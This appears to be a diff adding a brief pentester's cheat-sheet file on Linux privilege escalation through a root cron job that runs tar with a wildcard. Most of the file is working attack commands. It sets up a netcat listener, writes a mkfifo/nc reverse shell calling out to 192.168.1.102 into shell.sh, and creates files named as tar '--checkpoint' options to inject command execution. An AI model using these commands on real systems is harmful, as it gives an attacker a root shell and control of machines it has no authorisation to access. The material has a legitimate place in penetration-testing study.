@@ -1,0 +1,18 @@
+# common privesc
+#
+# What's in the crontab? can we exploit a tar job?
+# LINK: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+# TL;DR : wildcards will interprpet everything in the directory, by making files that 
+# have valid tar checkpoint commands, we can get a reverse shell
+# sample crontab entry: */5 * * * * root /usr/bin/compress.sh
+# say compress.sh has at least these two lines
+# Sample compress.sh  : cd /home/someuser/backup; tar cfz /home/someuser/backup/backup.tar.gz *
+#
+# Exploit it
+# attacker: nc -nvlp 5555
+# on target in /home/someuser/backup 
+echo "mkfifo /tmp/lhennp; nc 192.168.1.102 5555 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
+
+
